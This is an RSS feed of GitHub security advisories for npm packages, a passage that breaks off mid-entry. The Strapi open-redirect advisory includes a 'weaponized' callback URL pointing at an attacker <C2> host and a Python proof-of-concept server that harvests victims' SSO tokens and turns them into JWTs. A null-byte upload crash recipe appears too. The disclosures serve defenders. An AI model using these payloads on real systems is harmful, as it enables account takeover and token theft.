<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/npm.rss</id>
    <title>Security Advisory for JavaScript packages hosted at npmjs.com</title>
    <updated>2024-06-14T16:01:24.474Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"/>
    <subtitle>Security Advisory for JavaScript packages hosted at npmjs.com on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[@azure/msal-node] Azure Identity Libraries and Microsoft Authentication Library Elevation of Privilege Vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-m5vv-6r4h-3vj9</id>
        <link href="https://github.com/advisories/GHSA-m5vv-6r4h-3vj9"/>
        <updated>2024-06-13T18:44:18.000Z</updated>
        <content type="html"><![CDATA[<p>Azure Identity Libraries and Microsoft Authentication Library Elevation of Privilege Vulnerability.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-35255">https://nvd.nist.gov/vuln/detail/CVE-2024-35255</a></li>
<li><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-35255">https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-35255</a></li>
<li><a href="https://github.com/Azure/azure-sdk-for-go/commit/50774cd9709905523136fb05e8c85a50e8984499">https://github.com/Azure/azure-sdk-for-go/commit/50774cd9709905523136fb05e8c85a50e8984499</a></li>
<li><a href="https://github.com/Azure/azure-sdk-for-js/commit/c6aa75d312ae463e744163cedfd8fc480cc8d492">https://github.com/Azure/azure-sdk-for-js/commit/c6aa75d312ae463e744163cedfd8fc480cc8d492</a></li>
<li><a href="https://github.com/Azure/azure-sdk-for-python/commit/cb065acd7d0f957327dc4f02d1646d4e51a94178">https://github.com/Azure/azure-sdk-for-python/commit/cb065acd7d0f957327dc4f02d1646d4e51a94178</a></li>
<li><a href="https://github.com/Azure/azure-sdk-for-java/commit/5bf020d6ea056de40e2738e3647a4e06f902c18d">https://github.com/Azure/azure-sdk-for-java/commit/5bf020d6ea056de40e2738e3647a4e06f902c18d</a></li>
<li><a href="https://github.com/Azure/azure-sdk-for-net/commit/9279a4f38bf69b457cfb9b354f210e0a540a5c53">https://github.com/Azure/azure-sdk-for-net/commit/9279a4f38bf69b457cfb9b354f210e0a540a5c53</a></li>
<li><a href="https://github.com/advisories/GHSA-m5vv-6r4h-3vj9">https://github.com/advisories/GHSA-m5vv-6r4h-3vj9</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-m5vv-6r4h-3vj9</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-06-11T18:30:50.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[summernote] SummerNote Cross Site Scripting Vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-cc55-mvqc-g9mg</id>
        <link href="https://github.com/advisories/GHSA-cc55-mvqc-g9mg"/>
        <updated>2024-06-12T19:45:07.000Z</updated>
        <content type="html"><![CDATA[<p>SummerNote 0.8.18 is vulnerable to Cross Site Scripting (XSS) via the Code View Function.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-37629">https://nvd.nist.gov/vuln/detail/CVE-2024-37629</a></li>
<li><a href="https://github.com/summernote/summernote/issues/4642">https://github.com/summernote/summernote/issues/4642</a></li>
<li><a href="https://grumpz.net/cve-2024-37629-simple-xss-payload-exploits-0day-vulnerability-in-10000-web-apps">https://grumpz.net/cve-2024-37629-simple-xss-payload-exploits-0day-vulnerability-in-10000-web-apps</a></li>
<li><a href="https://github.com/advisories/GHSA-cc55-mvqc-g9mg">https://github.com/advisories/GHSA-cc55-mvqc-g9mg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-cc55-mvqc-g9mg</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-06-12T18:30:41.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@strapi/plugin-users-permissions] @strapi/plugin-users-permissions leaks 3rd party authentication tokens and authentication bypass]]></title>
        <id>https://github.com/advisories/GHSA-wrvh-rcmr-9qfc</id>
        <link href="https://github.com/advisories/GHSA-wrvh-rcmr-9qfc"/>
        <updated>2024-06-12T19:39:13.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>By combining two vulnerabilities (an <code>Open Redirect</code> and <code>session token sent as URL query parameter</code>) in Strapi framework is its possible of an unauthenticated attacker to bypass authentication mechanisms and retrieve the 3rd party tokens. The attack requires user interaction (one click).</p>
<h3 id="impact">Impact</h3>
<p>Unauthenticated attackers can leverage two vulnerabilities to obtain an 3rd party token and the bypass authentication of Strapi apps.</p>
<h3 id="technical-details">Technical details</h3>
<h4 id="vulnerability-1-open-redirect">Vulnerability 1: Open Redirect</h4>
<h5 id="description">Description</h5>
<p>Open redirection vulnerabilities arise when an application incorporates user-controllable data into the target of a redirection in an unsafe way. An attacker can construct a URL within the application that causes a redirection to an arbitrary external domain.</p>
<p>In the specific context of Strapi, this vulnerability allows the SSO token to be stolen, allowing an attacker to authenticate himself within the application.</p>
<h5 id="remediation">Remediation</h5>
<p>If possible, applications should avoid incorporating user-controllable data into redirection targets. In many cases, this behavior can be avoided in two ways:</p>
<ul>
<li>Remove the redirection function from the application, and replace links to it with direct links to the relevant target URLs.</li>
<li>Maintain a server-side list of all URLs that are permitted for redirection. Instead of passing the target URL as a parameter to the redirector, pass an index into this list.</li>
</ul>
<p>If it is considered unavoidable for the redirection function to receive user-controllable input and incorporate this into the redirection target, one of the following measures should be used to minimize the risk of redirection attacks:</p>
<ul>
<li>The application should use relative URLs in all of its redirects, and the redirection function should strictly validate that the URL received is a relative URL.</li>
<li>The application should use URLs relative to the web root for all of its redirects, and the redirection function should validate that the URL received starts with a slash character. It should then prepend <span dir=""><a href="http://yourdomainname.com">http://yourdomainname.com</a></span> to the URL before issuing the redirect.</li>
</ul>
<h6 id="example-1-open-redirect-in-apiconnectmicrosoft-via-_getcallback">Example 1: Open Redirect in <span dir="">/api/connect/microsoft</span> via <code>$_GET["callback"]</code></h6>
<ul>
<li>Path: <span dir="">/api/connect/microsoft</span></li>
<li>Parameter: <code>$_GET["callback"]</code></li>
</ul>
<p>Payload:</p>
<pre><code class="language-plaintext">https://google.fr/
</code></pre>
<p>Final payload:</p>
<pre><code class="language-plaintext">https://&lt;TARGET&gt;/api/connect/microsoft?callback=https://google.fr/
</code></pre>
<p>User clicks on the link:
<img alt="c1" src="https://github.com/strapi/strapi/assets/30262080/c1944cf8-2ef0-4214-ba9e-d4aad10d85ba"></p>
<p>Look at the intercepted request in Burp and see the redirect to Microsoft:</p>
<p><img alt="c0" src="https://github.com/strapi/strapi/assets/30262080/0c3d9289-432c-46ac-a7e3-eafe15f02483"></p>
<p>Microsoft check the cookies and redirects to the original domain (and route) but with different GET parameters.</p>
<p>Then, the page redirects to the domain controlled by the attacker (and a token is added to controlled the URL):</p>
<p><img alt="c2" src="https://github.com/strapi/strapi/assets/30262080/009e3898-1ccf-4ee4-9c29-496ff6b302d0"></p>
<p>The domain originally specified (<a href="https://google.fr">https://google.fr</a>) as <code>$_GET["callback"]</code> parameter is present in the cookies. So <span dir="">&lt;TARGET&gt;</span> is using the cookies (<code>koa.sess</code>) to redirect.</p>
<p><img alt="c3" src="https://github.com/strapi/strapi/assets/30262080/4c25cb6c-c9e8-4c2d-aa61-1ad1442e5f4d"></p>
<p><code>koa.sess</code> cookie:</p>
<pre><code class="language-base64">eyJncmFudCI6eyJwcm92aWRlciI6Im1pY3Jvc29mdCIsImR5bmFtaWMiOnsiY2FsbGJhY2siOiJodHRwczovL2dvb2dsZS5mci8ifX0sIl9leHBpcmUiOjE3MDAyMzQyNDQyNjMsIl9tYXhBZ2UiOjg2NDAwMDAwfQ==
</code></pre>
<pre><code class="language-json">{"grant":{"provider":"microsoft","dynamic":{"callback":"https://google.fr/"}},"_expire":1700234244263,"_maxAge":86400000}
</code></pre>
<p>The vulnerability seems to come from the application's core:</p>
<p>File: <a href="https://github.com/strapi/strapi/blob/develop/packages/plugins/users-permissions/server/controllers/auth.js"><span dir="">packages/plugins/users-permissions/server/controllers/auth.js</span></a></p>
<pre><code class="language-js">'use strict';

/**
 * Auth.js controller
 *
 * @description: A set of functions called "actions" for managing `Auth`.
 */

/* eslint-disable no-useless-escape */
const crypto = require('crypto');
const _ = require('lodash');
const { concat, compact, isArray } = require('lodash/fp');
const utils = require('@strapi/utils');
const {
  contentTypes: { getNonWritableAttributes },
} = require('@strapi/utils');
const { getService } = require('../utils');
const {
  validateCallbackBody,
  validateRegisterBody,
  validateSendEmailConfirmationBody,
  validateForgotPasswordBody,
  validateResetPasswordBody,
  validateEmailConfirmationBody,
  validateChangePasswordBody,
} = require('./validation/auth');

const { getAbsoluteAdminUrl, getAbsoluteServerUrl, sanitize } = utils;
const { ApplicationError, ValidationError, ForbiddenError } = utils.errors;

const sanitizeUser = (user, ctx) =&gt; {
  const { auth } = ctx.state;
  const userSchema = strapi.getModel('plugin::users-permissions.user');

  return sanitize.contentAPI.output(user, userSchema, { auth });
};

module.exports = {
  async callback(ctx) {
    const provider = ctx.params.provider || 'local';
    const params = ctx.request.body;

    const store = strapi.store({ type: 'plugin', name: 'users-permissions' });
    const grantSettings = await store.get({ key: 'grant' });

    const grantProvider = provider === 'local' ? 'email' : provider;

    if (!_.get(grantSettings, [grantProvider, 'enabled'])) {
      throw new ApplicationError('This provider is disabled');
    }

    if (provider === 'local') {
      await validateCallbackBody(params);

      const { identifier } = params;

      // Check if the user exists.
      const user = await strapi.query('plugin::users-permissions.user').findOne({
        where: {
          provider,
          $or: [{ email: identifier.toLowerCase() }, { username: identifier }],
        },
      });

      if (!user) {
        throw new ValidationError('Invalid identifier or password');
      }

      if (!user.password) {
        throw new ValidationError('Invalid identifier or password');
      }

      const validPassword = await getService('user').validatePassword(
        params.password,
        user.password
      );

      if (!validPassword) {
        throw new ValidationError('Invalid identifier or password');
      }

      const advancedSettings = await store.get({ key: 'advanced' });
      const requiresConfirmation = _.get(advancedSettings, 'email_confirmation');

      if (requiresConfirmation &amp;&amp; user.confirmed !== true) {
        throw new ApplicationError('Your account email is not confirmed');
      }

      if (user.blocked === true) {
        throw new ApplicationError('Your account has been blocked by an administrator');
      }

      return ctx.send({
        jwt: getService('jwt').issue({ id: user.id }),
        user: await sanitizeUser(user, ctx),
      });
    }

    // Connect the user with the third-party provider.
    try {
      const user = await getService('providers').connect(provider, ctx.query);

      if (user.blocked) {
        throw new ForbiddenError('Your account has been blocked by an administrator');
      }

      return ctx.send({
        jwt: getService('jwt').issue({ id: user.id }),
        user: await sanitizeUser(user, ctx),
      });
    } catch (error) {
      throw new ApplicationError(error.message);
    }
  },

  //...

  async connect(ctx, next) {
    const grant = require('grant-koa');

    const providers = await strapi
      .store({ type: 'plugin', name: 'users-permissions', key: 'grant' })
      .get();

    const apiPrefix = strapi.config.get('api.rest.prefix');
    const grantConfig = {
      defaults: {
        prefix: `${apiPrefix}/connect`,
      },
      ...providers,
    };

    const [requestPath] = ctx.request.url.split('?');
    const provider = requestPath.split('/connect/')[1].split('/')[0];

    if (!_.get(grantConfig[provider], 'enabled')) {
      throw new ApplicationError('This provider is disabled');
    }

    if (!strapi.config.server.url.startsWith('http')) {
      strapi.log.warn(
        'You are using a third party provider for login. Make sure to set an absolute url in config/server.js. More info here: https://docs.strapi.io/developer-docs/latest/plugins/users-permissions.html#setting-up-the-server-url'
      );
    }

    // Ability to pass OAuth callback dynamically
    grantConfig[provider].callback =
      _.get(ctx, 'query.callback') ||
      _.get(ctx, 'session.grant.dynamic.callback') ||
      grantConfig[provider].callback;
    grantConfig[provider].redirect_uri = getService('providers').buildRedirectUri(provider);

    return grant(grantConfig)(ctx, next);
  },

  //...

};
</code></pre>
<p>And more specifically:</p>
<pre><code class="language-js">...

    // Ability to pass OAuth callback dynamically
    grantConfig[provider].callback =
      _.get(ctx, 'query.callback') ||
      _.get(ctx, 'session.grant.dynamic.callback') ||
      grantConfig[provider].callback;
    grantConfig[provider].redirect_uri = getService('providers').buildRedirectUri(provider);

    return grant(grantConfig)(ctx, next);
...
</code></pre>
<p>Possible patch:</p>
<pre><code class="language-js">grantConfig[provider].callback = process.env[`${provider.toUpperCase()}_REDIRECT_URL`] || grantConfig[provider].callback
</code></pre>
<p><code>_.get(ctx, 'query.callback')</code> = <code>$_GET["callback"]</code> and <code>_.get(ctx, 'session')</code> = <code>$_COOKIE["koa.sess"]</code> (which is <code>{"grant":{"provider":"microsoft","dynamic":{"callback":"https://XXXXXXX/"}},"_expire":1701275652123,"_maxAge":86400000}</code>) so <code>_.get(ctx, 'session.grant.dynamic.callback')</code> = <code>https://XXXXXXX/</code>.</p>
<p>The route is clearly defined here:</p>
<p>File: <a href="https://github.com/strapi/strapi/blob/develop/packages/plugins/users-permissions/server/routes/content-api/auth.js"><span dir="">packages/plugins/users-permissions/server/routes/content-api/auth.js</span></a></p>
<pre><code class="language-js">'use strict';

module.exports = [

//...

  {
    method: 'GET',
    path: '/auth/:provider/callback',
    handler: 'auth.callback',
    config: {
      prefix: '',
    },
  },

  //...

];
</code></pre>
<p>File: <a href="https://github.com/strapi/strapi/blob/develop/packages/plugins/users-permissions/server/services/providers-registry.js"><span dir="">packages/plugins/users-permissions/server/services/providers-registry.js</span></a></p>
<pre><code class="language-js">
const getInitialProviders = ({ purest }) =&gt; ({

//..

  async microsoft({ accessToken }) {
    const microsoft = purest({ provider: 'microsoft' });

    return microsoft
      .get('me')
      .auth(accessToken)
      .request()
      .then(({ body }) =&gt; ({
        username: body.userPrincipalName,
        email: body.userPrincipalName,
      }));
  },

//..

});
</code></pre>
<p>If parameter <code>$_GET["callback"]</code> is defined in the GET request, the assignment does not evaluate all conditions, but stops at the beginning. The value is then stored in the cookie <code>koa.sess</code>:</p>
<p><code>koa.sess</code>=<code>eyJncmFudCI6eyJwcm92aWRlciI6Im1pY3Jvc29mdCIsImR5bmFtaWMiOnsiY2FsbGJhY2siOiJodHRwczovL2FkbWluLmludGUubmV0YXRtby5jb20vdXNlcnMvYXV0aC9yZWRpcmVjdCJ9fSwiX2V4cGlyZSI6MTcwMTI3NTY1MjEyMywiX21heEFnZSI6ODY0MDAwMDB9</code></p>
<p>Which once base64 decoded become <code>{"grant":{"provider":"microsoft","dynamic":{"callback":"https://&lt;TARGET&gt;/users/auth/redirect"}},"_expire":1701275652123,"_maxAge":86400000}</code>.</p>
<p>The signature of the cookie is stored in cookie <code>koa.sess.sig</code>:</p>
<p><code>koa.sess.sig</code>=<code>wTRmcVRrn88hWMdg84VvSD87-_0</code></p>
<p>File: <a href="https://github.com/strapi/strapi/blob/develop/packages/plugins/users-permissions/server/bootstrap/grant-config.js"><span dir="">packages/plugins/users-permissions/server/bootstrap/grant-config.js</span></a></p>
<pre><code class="language-js">
//..

  microsoft: {
    enabled: false,
    icon: 'windows',
    key: '',
    secret: '',
    callback: `${baseURL}/microsoft/callback`,
    scope: ['user.read'],
  },

//..
</code></pre>
<h4 id="vulnerability-2-session-token-in-url">Vulnerability 2: Session token in URL</h4>
<h5 id="description-1">Description</h5>
<p>Applications should not send session tokens as URL query parameters and use instead an alternative mechanism for transmitting session tokens, such as HTTP cookies or hidden fields in forms that are submitted using the POST method.</p>
<h6 id="example-1-sso-token-transmitted-within-url-_getaccess_token">Example 1: SSO token transmitted within URL (<code>$_GET["access_token"]</code>)</h6>
<ul>
<li>Path: <span dir="">/api/connect/microsoft</span></li>
<li>Parameter: <code>$_GET["callback"]</code></li>
</ul>
<p>When a callback was called, the 3rd party token was transmitted in an insecure way within the URL, which could be used to increase the impact of the Open Redirect vulnerability described previously by stealing the SSO token.</p>
<p>Weaponized payload:</p>
<pre><code class="language-plaintext">https://&lt;TARGET&gt;/api/connect/microsoft?callback=http://&lt;C2&gt;:8080/
</code></pre>
<p>With a web server specially developed to exploit the vulnerability listening on <span dir="">&lt;C2&gt;:8080</span>,  it is possible to retrieve a JWT token allowing authentication on Strapi.</p>
<p>A user is on his browser when he decides to click on a link sent to him by e-mail.</p>
<p><img alt="c4" src="https://github.com/strapi/strapi/assets/30262080/c6e22fa1-14a4-4c76-a832-d07305f265b6"></p>
<blockquote>
<p>The attacker places the malicious link in the URL bar to simulate a victim's click.</p>
</blockquote>
<p><img alt="c5" src="https://github.com/strapi/strapi/assets/30262080/4da28c5b-6501-4f93-9041-9917a2b070e6"></p>
<p>The server specially developed by the attacker to show that the vulnerability is exploitable, recovers the user's SSO token.</p>
<blockquote>
<p>Everything is invisible to the victim.</p>
</blockquote>
<p><img alt="c6" src="https://github.com/strapi/strapi/assets/30262080/58db0a31-3b3b-4648-958b-953eba88bf87"></p>
<p>Because the victim didn't change to another Web page.</p>
<p><img alt="c7" src="https://github.com/strapi/strapi/assets/30262080/ab4dd6f9-02e1-42c9-9142-434db865f0d3"></p>
<p>The attacker can use the SSO token to authenticate himself within the application and retrieve a valid JWT token enabling him to interact with it.</p>
<p><img alt="c8" src="https://github.com/strapi/strapi/assets/30262080/aab8d22f-5f0e-4a67-85a8-2e333df9b84b"></p>
<h5 id="details">Details</h5>
<h6 id="get-the-jwt-token-with-the-access_token">Get the JWT token with the <code>access_token</code></h6>
<p>First of all, thanks to the SSO token, you authenticate yourself and get a JWT token to be able to interact with the various API routes.</p>
<p>Request (HTTP):</p>
<pre><code class="language-http">GET /api/auth/microsoft/callback?access_token=eyJ0eXAiOiJKV&lt;REDACTED&gt;yBzA HTTP/1.1
Host: &lt;TARGET&gt;
</code></pre>
<p>Response (HTTP):</p>
<pre><code class="language-http">HTTP/1.1 200 OK
Server: nginx
Date: Mon, 27 Nov 2023 17:58:46 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 411
Connection: keep-alive
Content-Security-Policy: connect-src 'self' https:;img-src 'self' data: blob: https://market-assets.strapi.io;media-src 'self' data: blob:;default-src 'self';base-uri 'self';font-src 'self' https: data:;form-action 'self';frame-ancestors 'self';object-src 'none';script-src 'self';script-src-attr 'none';style-src 'self' https: 'unsafe-inline'
Referrer-Policy: no-referrer
Strict-Transport-Security: max-age=31536000; includeSubDomains
X-Content-Type-Options: nosniff
X-DNS-Prefetch-Control: off
X-Download-Options: noopen
X-Frame-Options: SAMEORIGIN
X-Permitted-Cross-Domain-Policies: none
Vary: Origin
X-XSS-Protection: 1; mode=block
Strict-Transport-Security: max-age=31536000; includeSubDomains
X-Powered-By: &lt;REDACTED&gt;

{"jwt":"eyJhbG&lt;REDACTED&gt;eCac","user":{"id":111,"username":"&lt;REDACTED&gt;@&lt;REDACTED&gt;-ext.com","email":"&lt;redacted&gt;@&lt;redacted&gt;-ext.com","provider":"microsoft","confirmed":true,"blocked":false,"createdAt":"2023-11-14T12:35:42.440Z","updatedAt":"2023-11-16T21:00:19.241Z","is_external":false}}
</code></pre>
<h6 id="request-api-routes-using-the-jwt-token">Request API routes using the JWT token</h6>
<p>Then reuse the JWT token to request the API.</p>
<p>Request (HTTP):</p>
<pre><code class="language-http">GET /api/users/me/groups?app=support HTTP/1.1
Host: &lt;TARGET&gt;
Authorization: Bearer eyJ&lt;REDACTED&gt;EeCac
</code></pre>
<p>Response (HTTP):</p>
<pre><code class="language-http">HTTP/1.1 200 OK
Server: nginx
Date: Tue, 28 Nov 2023 13:45:42 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 24684
Connection: keep-alive
Content-Security-Policy: connect-src 'self' https:;img-src 'self' data: blob: https://market-assets.strapi.io;media-src 'self' data: blob:;default-src 'self';base-uri 'self';font-src 'self' https: data:;form-action 'self';frame-ancestors 'self';object-src 'none';script-src 'self';script-src-attr 'none';style-src 'self' https: 'unsafe-inline'
Referrer-Policy: no-referrer
Strict-Transport-Security: max-age=31536000; includeSubDomains
X-Content-Type-Options: nosniff
X-DNS-Prefetch-Control: off
X-Download-Options: noopen
X-Frame-Options: SAMEORIGIN
X-Permitted-Cross-Domain-Policies: none
Vary: Origin
X-RateLimit-Limit: 10
X-RateLimit-Remaining: 9
X-RateLimit-Reset: 1701179203
X-XSS-Protection: 1; mode=block
Strict-Transport-Security: max-age=31536000; includeSubDomains
X-Powered-By: &lt;REDACTED&gt;

{"apps":{"support":{"groups":[{"device_whitelist":null,"name":"test - support","id":10,"group_privileges":[{"id":37,&lt;REDACTED&gt;

...
</code></pre>
<h3 id="poc-web-server-stealing-sso-token-and-retrieving-jwt-token-then-bypassing-authentication">POC (Web server stealing SSO token and retrieving JWT token then bypassing authentication)</h3>
<pre><code class="language-python">import base64
import json
import urllib.parse

from http.server import BaseHTTPRequestHandler, HTTPServer
from sys import argv


# Strapi URL.
TARGET = "target.com"

# URLs to which victims are automatically redirected.
REDIRECT_URL = [
    "strapi.io",
    "www.google.fr"
]
# URL used to generate a valid JWT token for authentication within the
# application.
GEN_JWT_URL = f"https://{TARGET}/api/auth/microsoft/callback"


# This function is used to generate a curl command which once executed, will
# give us a valid JWT connection token.
def generate_curl_command(token):
    command = f"curl '{GEN_JWT_URL}?access_token={token}'"
    return command


# We create a custom HTTP server to retrieve users' SSO tokens.
class CustomServer(BaseHTTPRequestHandler):

    # Here we override the default logging function to reduce verbosity.
    def log_message(self, format, *args):
        pass

    # This function automatically redirects a user to the page defined in the
    # global variable linked to the redirection.
    def _set_response(self):
        self.send_response(302)
        self.send_header("Location", REDIRECT_URL[0])
        self.end_headers()

    # If an SSO token is present, we parse it and log the result in STDOUT.
    def do_GET(self):
        # This condition checks whether a token is present in the URL.
        if str(self.path).find("access_token") != -1:
            # If this is the case, we recover the token.
            query = urllib.parse.urlparse(self.path).query
            query_components = dict(qc.split("=") for qc in query.split("&amp;"))
            access_token = urllib.parse.unquote(query_components["access_token"])

            # In the token, which is a string in JWT format, we retrieve the
            # body part of the token.
            interesting_data = access_token.split(".")[1]

            # Patching base64 encoded data.
            interesting_data = interesting_data + "=" * (-len(interesting_data) % 4)

            # Parsing JSON.
            json_data = json.loads(base64.b64decode(interesting_data.encode()))
            family_name, given_name, ipaddr, upn = json_data["given_name"], json_data["family_name"], json_data["ipaddr"], json_data["upn"]

            print(f"[+] Token captured for {family_name} {given_name}, {upn} ({ipaddr}):\n{access_token}\n")
            print(f"[*] Run: \"{generate_curl_command(query_components['access_token'])}\" to get JWT token")

        self._set_response()
        self.wfile.write("Redirecting ...".encode("utf-8"))


def run(server_class=HTTPServer, handler_class=CustomServer, ip="0.0.0.0", port=8080):
    server_address = (ip, port)
    httpd = server_class(server_address, handler_class)

    print(f"Starting httpd ({ip}:{port}) ...")
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        pass

    httpd.server_close()
    print("Stopping httpd ...")


if __name__ == "__main__":
    if len(argv) == 3:
        run(ip=argv[1], port=int(argv[2]))
    else:
        run()
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/strapi/strapi/security/advisories/GHSA-wrvh-rcmr-9qfc">https://github.com/strapi/strapi/security/advisories/GHSA-wrvh-rcmr-9qfc</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-34065">https://nvd.nist.gov/vuln/detail/CVE-2024-34065</a></li>
<li><a href="https://github.com/strapi/strapi/commit/9c79921d22142a5de77ea26151550a14e4b12669">https://github.com/strapi/strapi/commit/9c79921d22142a5de77ea26151550a14e4b12669</a></li>
<li><a href="https://github.com/advisories/GHSA-wrvh-rcmr-9qfc">https://github.com/advisories/GHSA-wrvh-rcmr-9qfc</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-wrvh-rcmr-9qfc</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-06-12T19:39:11.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@strapi/plugin-upload] @strapi/plugin-upload  has a Denial-of-Service via Improper Exception Handling]]></title>
        <id>https://github.com/advisories/GHSA-pm9q-xj9p-96pm</id>
        <link href="https://github.com/advisories/GHSA-pm9q-xj9p-96pm"/>
        <updated>2024-06-12T19:38:25.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>A Denial-of-Service was found in the media upload process causing the server to crash without restarting, affecting either development and production environments.</p>
<h3 id="details">Details</h3>
<p>Usually, errors in the application cause it to log the error and keep it running for other clients. This behavior, in contrast, stops the server execution, making it unavailable for any clients until it's manually restarted. </p>
<h3 id="poc">PoC</h3>
<p>Due to a bug in what we believe to be Burp’s decoding system, we couldn’t produce a valid file to easily reproduce the vulnerability. Instead, the issue can be reproduced by following these steps:</p>
<ol>
<li>Configure Burp’s proxy between a browser and a Strapi server</li>
<li>Log in and upload an image through the Media Library page while having Burp’s interceptor turned on</li>
<li>After capturing the upload POST request in Burp, add <code>%00</code> at the end of the file extension from the <code>Content-Disposition</code>, in the filename parameter (See reference image 1 below)</li>
<li>Using the cursor, select the added <code>%00</code> and right-click it. Click in Convert selection &gt; URL &gt; URL decode to transform the selected text into a null byte</li>
<li>Forward the modified request. The server should print an error and crash with the error <code>ERR_INVALID_ARG_VALUE</code> (See reference log 1 below)</li>
</ol>
<p>By following the data flow, we reached the <a href="https://github.com/strapi/strapi/blob/f1dd5cc8eef574bac6679aab6f93276e57497328/packages/providers/upload-local/src/index.ts#L86">line of code</a> where we believe the DoS is being caused.
The simpler way of fixing this vulnerability seems to be avoiding the error thrown by whitelisting the characters used in the extension.</p>
<h4 id="reference-image-1">Reference Image 1</h4>
<p><img alt="image" src="https://github.com/strapi/strapi/assets/8593673/c95278a1-1727-485e-b6f8-276074d9dd42"></p>
<h4 id="reference-log-1">Reference Log 1</h4>
<pre><code>[2024-03-22 10:23:42.629] http: POST /upload (22 ms) 400
node:internal/fs/utils:379
  const err = new ERR_INVALID_ARG_VALUE(
              ^

TypeError [ERR_INVALID_ARG_VALUE]: The argument 'path' must be a string, Uint8Array, or URL without null bytes. Received '/mnt/storage/Development/GHSA-pm9q-xj9p-96pm/public/uploads/replaceme_png_88efe6a165.png\x00'
    at new WriteStream (node:internal/fs/streams:340:5)
    at Object.createWriteStream (node:fs:3123:10)
    at /mnt/storage/Development/GHSA-pm9q-xj9p-96pm/node_modules/@strapi/provider-upload-local/dist/index.js:71:33
    at new Promise (&lt;anonymous&gt;)
    at Object.uploadStream (/mnt/storage/Development/GHSA-pm9q-xj9p-96pm/node_modules/@strapi/provider-upload-local/dist/index.js:68:16)
    at Object.uploadStream (/mnt/storage/Development/GHSA-pm9q-xj9p-96pm/node_modules/@strapi/plugin-upload/server/register.js:80:35)
    at Object.upload (/mnt/storage/Development/GHSA-pm9q-xj9p-96pm/node_modules/@strapi/plugin-upload/server/services/provider.js:16:46)
    at Object.uploadImage (/mnt/storage/Development/GHSA-pm9q-xj9p-96pm/node_modules/@strapi/plugin-upload/server/services/upload.js:220:48) {
  code: 'ERR_INVALID_ARG_VALUE'
}
</code></pre>
<h3 id="impact">Impact</h3>
<p>Denial-of-Service occurs when a service becomes unavailable for users or other services.
By sending a specially-crafted request, the server crashes without restarting. The entire server crashes with the thrown error instead of crashing only the single request and returning error 500 to the user.
Any user with access to the file upload functionality is able to exploit this vulnerability, affecting applications running in both development mode and production mode as well.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/strapi/strapi/security/advisories/GHSA-pm9q-xj9p-96pm">https://github.com/strapi/strapi/security/advisories/GHSA-pm9q-xj9p-96pm</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-31217">https://nvd.nist.gov/vuln/detail/CVE-2024-31217</a></li>
<li><a href="https://github.com/strapi/strapi/commit/a0da7e73e1496d835fe71a2febb14f70170135c7">https://github.com/strapi/strapi/commit/a0da7e73e1496d835fe71a2febb14f70170135c7</a></li>
<li><a href="https://github.com/advisories/GHSA-pm9q-xj9p-96pm">https://github.com/advisories/GHSA-pm9q-xj9p-96pm</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-pm9q-xj9p-96pm</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-06-12T19:38:24.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@strapi/plugin-content-manager] @strapi/plugin-content-manager leaks data via relations via the Admin Panel]]></title>
        <id>https://github.com/advisories/GHSA-6j89-frxc-q26m</id>
        <link href="https://github.com/advisories/GHSA-6j89-frxc-q26m"/>
        <updated>2024-06-14T11:52:08.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<ol>
<li>If a super admin creates a collection where an item in the collection has an association to another collection, a user with the Author Role can see the list of associated items they did not create. They should only see their own items that they created, not all items ever created.</li>
</ol>
<h3 id="details">Details</h3>
<p>At the top level every collection shows blank items for an Author if they did not create the item. This is ideal and works great. However if you associate one private collection to another private collection and an Author creates a new item. The pull down should not show the admins list of previously created items. It should be blank unitl they add their own items.</p>
<h3 id="poc">PoC</h3>
<ol>
<li>Sign in as Admin. Navigate to content creation.</li>
<li>Select a collection and verify you have items you created there. And that they have associations to other protected collections.</li>
<li>Verify role permissions for your collections are set to CRUD if user created.</li>
<li>Log out and sign in as a unrelated Author.</li>
<li>Navigate to content management and verify you see collections built by admin but empty for you (as expected)</li>
<li>Create a new item as an Author and see the card appear with attributes to fill out.</li>
<li>Use the form pull down for the associations.</li>
